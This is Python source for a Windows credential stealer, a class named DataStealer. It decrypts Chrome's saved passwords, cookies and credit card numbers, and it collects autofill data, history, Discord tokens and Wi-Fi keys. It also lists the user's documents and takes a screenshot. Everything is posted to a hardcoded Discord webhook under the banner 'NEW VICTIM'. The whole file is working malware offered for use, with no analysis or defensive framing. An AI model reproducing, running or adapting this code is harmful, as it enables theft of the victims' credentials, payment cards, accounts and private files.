import base64
import json
import os
import re
import sqlite3
import shutil
import subprocess
import sys
import tempfile
import urllib.request
import zipfile
from pathlib import Path
from datetime import datetime
import platform
import socket
import uuid
import psutil
import win32crypt
from Crypto.Cipher import AES

WEBHOOK_URL = "https://discord.com/api/webhooks/1476891601841426483/G_IyOjup2K5cIfRow7wWZQvPcX6k3INC51dfK_a_J6jhHEOQ9TNtfzUVmo2zi76uLAzX"

TOKEN_REGEX = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"
REQUEST_HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
}

class DataStealer:
    def __init__(self):
        self.webhook_url = WEBHOOK_URL
        self.local_app_data = os.getenv("LOCALAPPDATA")
        self.app_data = os.getenv("APPDATA")
        self.user_profile = os.getenv("USERPROFILE")
        self.temp_dir = tempfile.mkdtemp()
        self.collected_data = {
            "system": {},
            "tokens": {},
            "passwords": {},
            "cookies": {},
            "autofill": {},
            "credit_cards": {},
            "history": {},
            "bookmarks": {},
            "downloads": {},
            "wifi": {},
            "files": {},
            "screenshots": [],
            "processes": [],
            "network": {},
        }
    
    def send_webhook(self, content):
        """Send data to webhook with proper formatting"""
        try:
            
            if len(content) > 1900:
                chunks = [content[i:i+1900] for i in range(0, len(content), 1900)]
                for chunk in chunks:
                    data = {"content": chunk}
                    request = urllib.request.Request(
                        self.webhook_url,
                        data=json.dumps(data).encode(),
                        headers=REQUEST_HEADERS
                    )
                    with urllib.request.urlopen(request, timeout=10) as response:
                        if response.status != 204:
                            return False
                return True
            else:
                data = {"content": content}
                request = urllib.request.Request(
                    self.webhook_url,
                    data=json.dumps(data).encode(),
                    headers=REQUEST_HEADERS
                )
                with urllib.request.urlopen(request, timeout=10) as response:
                    return response.status == 204
        except Exception as e:
            print(f"Webhook error: {e}")
            return False
    
    def get_system_info(self):
        try:
            self.collected_data["system"] = {
                "hostname": socket.gethostname(),
                "username": os.getlogin(),
                "platform": platform.system(),
                "platform_release": platform.release(),
                "platform_version": platform.version(),
                "architecture": platform.machine(),
                "processor": platform.processor(),
                "ram": f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB",
                "mac_address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1]),
                "ip_address": self.get_public_ip(),
                "disk_usage": self.get_disk_usage(),
                "cpu_count": psutil.cpu_count(),
                "boot_time": datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S"),
            }
        except Exception as e:
            print(f"System info error: {e}")
    
    def get_public_ip(self):
        try:
            response = urllib.request.urlopen('https://api.ipify.org', timeout=5)
            return response.read().decode('utf-8')
        except:
            return "Unknown"
    
    def get_disk_usage(self):
        try:
            usage = psutil.disk_usage('/')
            return f"{round(usage.used / (1024**3), 2)} GB / {round(usage.total / (1024**3), 2)} GB"
        except:
            return "Unknown"
    
    def get_chrome_encryption_key(self):
        try:
            local_state_path = Path(self.local_app_data) / "Google" / "Chrome" / "User Data" / "Local State"
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]
            
            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except Exception as e:
            print(f"Chrome key error: {e}")
            return None
    
    def decrypt_chrome_data(self, data, key):
        try:
            iv = data[3:15]
            payload = data[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
            except:
                return ""
    
    def get_chrome_passwords(self):
        try:
            key = self.get_chrome_encryption_key()
            if not key:
                return
            
            
            try:
                subprocess.run(['taskkill', '/F', '/IM', 'chrome.exe'], capture_output=True)
            except:
                pass
            
            db_path = Path(self.local_app_data) / "Google" / "Chrome" / "User Data" / "Default" / "Login Data"
            if not db_path.exists():
                return
                
            temp_db = Path(self.temp_dir) / "LoginData"
            shutil.copy2(db_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            for row in cursor.fetchall():
                url, username, encrypted_password = row
                if username and encrypted_password:
                    password = self.decrypt_chrome_data(encrypted_password, key)
                    if url not in self.collected_data["passwords"]:
                        self.collected_data["passwords"][url] = []
                    self.collected_data["passwords"][url].append({
                        "username": username,
                        "password": password
                    })
            
            cursor.close()
            conn.close()
        except Exception as e:
            print(f"Chrome passwords error: {e}")
    
    def get_chrome_cookies(self):
        try:
            key = self.get_chrome_encryption_key()
            if not key:
                return
            
            db_path = Path(self.local_app_data) / "Google" / "Chrome" / "User Data" / "Default" / "Network" / "Cookies"
            if not db_path.exists():
                return
                
            temp_db = Path(self.temp_dir) / "Cookies"
            shutil.copy2(db_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
            
            for row in cursor.fetchall():
                host, name, encrypted_value = row
                if encrypted_value:
                    value = self.decrypt_chrome_data(encrypted_value, key)
                    if host not in self.collected_data["cookies"]:
                        self.collected_data["cookies"][host] = {}
                    self.collected_data["cookies"][host][name] = value
            
            cursor.close()
            conn.close()
        except Exception as e:
            print(f"Chrome cookies error: {e}")
    
    def get_chrome_history(self):
        try:
            db_path = Path(self.local_app_data) / "Google" / "Chrome" / "User Data" / "Default" / "History"
            if not db_path.exists():
                return
                
            temp_db = Path(self.temp_dir) / "History"
            shutil.copy2(db_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
            
            self.collected_data["history"] = []
            for row in cursor.fetchall():
                self.collected_data["history"].append({
                    "url": row[0],
                    "title": row[1],
                    "visit_count": row[2],
                })
            
            cursor.close()
            conn.close()
        except Exception as e:
            print(f"Chrome history error: {e}")
    
    def get_chrome_credit_cards(self):
        try:
            key = self.get_chrome_encryption_key()
            if not key:
                return
            
            db_path = Path(self.local_app_data) / "Google" / "Chrome" / "User Data" / "Default" / "Web Data"
            if not db_path.exists():
                return
                
            temp_db = Path(self.temp_dir) / "WebData"
            shutil.copy2(db_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
            
            for row in cursor.fetchall():
                name, month, year, encrypted_card = row
                if encrypted_card:
                    card_number = self.decrypt_chrome_data(encrypted_card, key)
                    self.collected_data["credit_cards"][name] = {
                        "number": card_number,
                        "expiry": f"{month}/{year}"
                    }
            
            cursor.close()
            conn.close()
        except Exception as e:
            print(f"Chrome credit cards error: {e}")
    
    def get_chrome_autofill(self):
        try:
            db_path = Path(self.local_app_data) / "Google" / "Chrome" / "User Data" / "Default" / "Web Data"
            if not db_path.exists():
                return
                
            temp_db = Path(self.temp_dir) / "WebData2"
            shutil.copy2(db_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT name, value FROM autofill")
            
            for row in cursor.fetchall():
                name, value = row
                self.collected_data["autofill"][name] = value
            
            cursor.close()
            conn.close()
        except Exception as e:
            print(f"Chrome autofill error: {e}")
    
    def get_discord_tokens(self):
        try:
            discord_paths = [
                Path(self.app_data) / "discord" / "Local Storage" / "leveldb",
                Path(self.app_data) / "discordcanary" / "Local Storage" / "leveldb",
                Path(self.app_data) / "discordptb" / "Local Storage" / "leveldb",
                Path(self.local_app_data) / "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb",
                Path(self.app_data) / "Opera Software" / "Opera Stable" / "Local Storage" / "leveldb",
                Path(self.local_app_data) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default" / "Local Storage" / "leveldb",
                Path(self.app_data) / "Microsoft" / "Edge" / "User Data" / "Default" / "Local Storage" / "leveldb",
            ]
            
            for path in discord_paths:
                if not path.exists():
                    continue
                
                for file in path.iterdir():
                    if not file.is_file():
                        continue
                    
                    try:
                        content = file.read_text(encoding='utf-8', errors='ignore')
                        tokens = re.findall(TOKEN_REGEX, content)
                        
                        for token in tokens:
                            user_id = self.get_user_id_from_token(token)
                            if user_id:
                                if user_id not in self.collected_data["tokens"]:
                                    self.collected_data["tokens"][user_id] = {
                                        "tokens": set(),
                                        "source": str(path)
                                    }
                                self.collected_data["tokens"][user_id]["tokens"].add(token)
                    except:
                        continue
        except Exception as e:
            print(f"Discord tokens error: {e}")
    
    def get_user_id_from_token(self, token):
        try:
            user_id = base64.b64decode(token.split(".", maxsplit=1)[0] + "==").decode("utf-8")
            return user_id
        except:
            return None
    
    def get_wifi_passwords(self):
        try:
            result = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], shell=True, text=True)
            profiles = re.findall(r'All User Profile\s*:\s*(.*)', result)
            
            for profile in profiles:
                profile = profile.strip()
                try:
                    password_result = subprocess.check_output(
                        f'netsh wlan show profile "{profile}" key=clear',
                        shell=True,
                        text=True
                    )
                    password_match = re.search(r'Key Content\s*:\s*(.*)', password_result)
                    if password_match:
                        self.collected_data["wifi"][profile] = password_match.group(1).strip()
                except:
                    continue
        except Exception as e:
            print(f"WiFi passwords error: {e}")
    
    def get_processes(self):
        try:
            for proc in psutil.process_iter(['pid', 'name', 'username']):
                try:
                    self.collected_data["processes"].append({
                        "pid": proc.info['pid'],
                        "name": proc.info['name'],
                        "username": proc.info['username']
                    })
                except:
                    continue
        except Exception as e:
            print(f"Process list error: {e}")
    
    def get_network_info(self):
        try:
            addrs = psutil.net_if_addrs()
            stats = psutil.net_if_stats()
            
            for interface, addr_list in addrs.items():
                self.collected_data["network"][interface] = {
                    "addresses": [],
                    "status": "up" if stats[interface].isup else "down"
                }
                for addr in addr_list:
                    self.collected_data["network"][interface]["addresses"].append({
                        "family": str(addr.family),
                        "address": addr.address
                    })
        except Exception as e:
            print(f"Network info error: {e}")
    
    def search_interesting_files(self):
        try:
            extensions = ['.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.png', '.jpg', '.jpeg']
            search_dirs = [
                Path(self.user_profile) / "Desktop",
                Path(self.user_profile) / "Documents",
                Path(self.user_profile) / "Downloads",
            ]
            
            for directory in search_dirs:
                if not directory.exists():
                    continue
                
                for ext in extensions:
                    for file in directory.rglob(f'*{ext}'):
                        try:
                            if file.stat().st_size < 10 * 1024 * 1024:
                                self.collected_data["files"][str(file)] = {
                                    "size": file.stat().st_size,
                                    "modified": datetime.fromtimestamp(file.stat().st_mtime).strftime("%Y-%m-%d %H:%M:%S")
                                }
                        except:
                            continue
        except Exception as e:
            print(f"File search error: {e}")
    
    def take_screenshot(self):
        try:
            import pyautogui
            screenshot_path = Path(self.temp_dir) / "screenshot.png"
            screenshot = pyautogui.screenshot()
            screenshot.save(screenshot_path)
            self.collected_data["screenshots"].append(str(screenshot_path))
        except Exception as e:
            print(f"Screenshot error: {e}")
    
    def collect_all_data(self):
        print("[*] Collecting system information...")
        self.get_system_info()
        
        print("[*] Extracting Chrome passwords...")
        self.get_chrome_passwords()
        
        print("[*] Extracting Chrome cookies...")
        self.get_chrome_cookies()
        
        print("[*] Extracting Chrome history...")
        self.get_chrome_history()
        
        print("[*] Extracting Chrome credit cards...")
        self.get_chrome_credit_cards()
        
        print("[*] Extracting Chrome autofill...")
        self.get_chrome_autofill()
        
        print("[*] Extracting Discord tokens...")
        self.get_discord_tokens()
        
        print("[*] Extracting WiFi passwords...")
        self.get_wifi_passwords()
        
        print("[*] Collecting process list...")
        self.get_processes()
        
        print("[*] Collecting network information...")
        self.get_network_info()
        
        print("[*] Searching for interesting files...")
        self.search_interesting_files()
        
        print("[*] Taking screenshot...")
        self.take_screenshot()
    
    def format_data_for_webhook(self):
        """Format all collected data into a readable string for webhook"""
        output = []
        
      
        if self.collected_data["system"]:
            output.append("**🖥️ SYSTEM INFORMATION**")
            for key, value in self.collected_data["system"].items():
                output.append(f"**{key}:** `{value}`")
            output.append("")
        
       
        if self.collected_data["tokens"]:
            output.append("**🔑 DISCORD TOKENS**")
            for user_id, data in self.collected_data["tokens"].items():
                output.append(f"**User ID:** `{user_id}`")
                for token in list(data["tokens"])[:3]:
                    output.append(f"Token: `{token}`")
                output.append(f"Source: `{data['source']}`")
                output.append("")
        
        
        if self.collected_data["passwords"]:
            output.append("**🔐 SAVED PASSWORDS**")
            for url, creds in list(self.collected_data["passwords"].items())[:5]:
                output.append(f"**{url}**")
                for cred in creds[:3]:
                    output.append(f"Username: `{cred['username']}`")
                    output.append(f"Password: `{cred['password']}`")
                output.append("")
        
       
        if self.collected_data["credit_cards"]:
            output.append("**💳 CREDIT CARDS**")
            for name, data in self.collected_data["credit_cards"].items():
                output.append(f"**{name}**")
                output.append(f"Number: `{data['number']}`")
                output.append(f"Expiry: `{data['expiry']}`")
                output.append("")
        
        
        if self.collected_data["wifi"]:
            output.append("**📶 WIFI PASSWORDS**")
            for ssid, password in list(self.collected_data["wifi"].items())[:10]:
                output.append(f"**{ssid}:** `{password}`")
            output.append("")
        
        
        if self.collected_data["history"]:
            output.append("**🌐 RECENT HISTORY**")
            for item in self.collected_data["history"][:10]:
                output.append(f"{item['url']}")
            output.append("")
        
       
        if self.collected_data["files"]:
            output.append("**📁 INTERESTING FILES**")
            for file_path in list(self.collected_data["files"].keys())[:10]:
                output.append(f"`{file_path}`")
            output.append("")
        
       
        if self.collected_data["processes"]:
            output.append("**⚙️ RUNNING PROCESSES**")
            for proc in self.collected_data["processes"][:15]:
                output.append(f"PID: {proc['pid']} - {proc['name']}")
            output.append("")
        
        
        if self.collected_data["network"]:
            output.append("**🌐 NETWORK INFORMATION**")
            for interface, data in self.collected_data["network"].items():
                output.append(f"**{interface}** ({data['status']})")
                for addr in data['addresses'][:2]:
                    output.append(f"  {addr['address']}")
            output.append("")
        
        return "\n".join(output)
    
    def send_data(self):
        print("[*] Formatting data for webhook...")
        formatted_data = self.format_data_for_webhook()
        
        if not formatted_data:
            formatted_data = "No data collected"
        
        
        header = f"**🚨 NEW VICTIM**\n**Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        formatted_data = header + formatted_data
        
        print("[*] Sending to webhook...")
        success = self.send_webhook(formatted_data)
        
        if success:
            print("[✓] Data sent successfully!")
        else:
            print("[✗] Failed to send data")
        
        try:
            with open(Path(self.temp_dir) / "stolen_data.json", "w") as f:
                json.dump({k: v for k, v in self.collected_data.items() if k != "tokens"}, f, indent=2, default=str)
        except:
            pass
    
    def cleanup(self):
        try:
            shutil.rmtree(self.temp_dir, ignore_errors=True)
        except:
            pass
    
    def run(self):
        try:
            print("[*] Starting data collection...")
            self.collect_all_data()
            self.send_data()
            print("[*] Collection complete!")
        except Exception as e:
            print(f"[✗] Error: {e}")
        finally:
            self.cleanup()


def main():
    stealer = DataStealer()
    stealer.run()


if __name__ == "__main__":
    main()